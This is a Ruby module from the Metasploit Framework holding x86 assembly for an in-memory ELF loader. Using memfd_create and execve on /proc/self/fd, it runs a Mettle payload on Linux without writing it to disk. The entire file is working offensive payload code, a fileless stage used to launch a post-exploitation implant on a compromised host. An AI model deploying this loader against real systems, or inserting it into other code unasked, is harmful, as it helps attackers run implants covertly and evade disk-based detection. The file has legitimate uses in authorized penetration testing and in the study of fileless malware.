#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Diego Ledda <diego_ledda[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
module Msf::Payload::Linux::X86::ElfLoader
  def in_memory_load(payload)
    in_memory_loader_asm = %^
      start:
        xor ecx, ecx
        push ecx
        lea ebx, [esp]
        inc ecx
        mov eax, 0x164
        int 0x80                            ; memfd_create("", MFD_CLOEXEC);
        mov ebx, eax
        jmp get_payload
      got_payload:
        pop ecx
        mov edx, #{payload.length}
        mov esi, eax
        mov eax, 0x4
        int 0x80                            ; write(fd, elfbuffer, elfbuffer_len);
        jmp get_command
      got_command:
        pop ebx
        mov ecx, 18
        mov eax, esi
      itoa:
        test eax, eax
        jz execve
        mov edx, 10
        div dl
        mov edx, eax
        shr edx, 8
        and eax, 255
        add edx, 48
        mov byte [ebx + ecx], dl
        dec ecx
        jmp itoa
      execve:
        xor ecx, ecx
        xor edx, edx
        mov eax, 0xb
        int 0x080                           ; execve("/proc/self/fd/<fd>", NULL, NULL);
      get_command:
        call got_command
        db "/proc/self/fd//////", 0x00
      get_payload:
        call got_payload
    ^
    in_memory_loader = Metasm::Shellcode.assemble(Metasm::X86.new, in_memory_loader_asm).encode_string
    in_memory_loader
  end
end
